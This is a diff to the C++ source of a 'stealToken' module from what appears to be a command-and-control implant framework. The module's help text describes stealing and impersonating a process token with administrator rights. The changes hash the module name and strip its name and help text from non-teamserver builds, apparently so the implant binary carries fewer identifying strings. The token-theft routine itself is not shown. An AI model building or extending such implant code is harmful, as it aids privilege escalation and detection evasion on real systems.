@@ -2,6 +2,7 @@
 
 #include <cstring>
 
+#include "Common.hpp"
 #include "Tools.hpp"
 
 #ifdef __linux__
@@ -18,7 +19,8 @@ using namespace std;
 
 #endif
 
-const std::string moduleName = "stealToken";
+constexpr std::string_view moduleName = "stealToken";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -31,7 +33,11 @@ __declspec(dllexport) StealToken* StealTokenConstructor()
 #endif
 
 StealToken::StealToken()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -42,11 +48,12 @@ StealToken::~StealToken()
 std::string StealToken::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "stealToken:\n";
 	info += "Steal a token and impersonate the it. You must have administrator privilege. \n";
 	info += "exemple:\n";
 	info += "- stealToken pid \n";
-
+#endif
 	return info;
 }
 
@@ -76,7 +83,7 @@ int StealToken::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     std::string result = stealToken(pid);
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd("");
 	c2RetMessage.set_returnvalue(result);
 	return 0;
